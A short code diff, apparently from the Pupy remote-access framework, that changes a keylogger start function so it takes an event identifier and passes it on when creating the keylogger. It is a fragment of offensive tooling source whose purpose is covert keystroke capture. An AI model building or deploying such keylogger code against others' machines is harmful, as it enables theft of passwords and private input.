@@ -63,12 +63,12 @@ UNPRINTABLE = {
 
 #some windows function defines :
 
-def keylogger_start():
+def keylogger_start(event_id=None):
     if pupy.manager.active(KeyLogger):
         return False
 
     try:
-        pupy.manager.create(KeyLogger)
+        pupy.manager.create(KeyLogger, event_id=event_id)
     except:
         return False
 
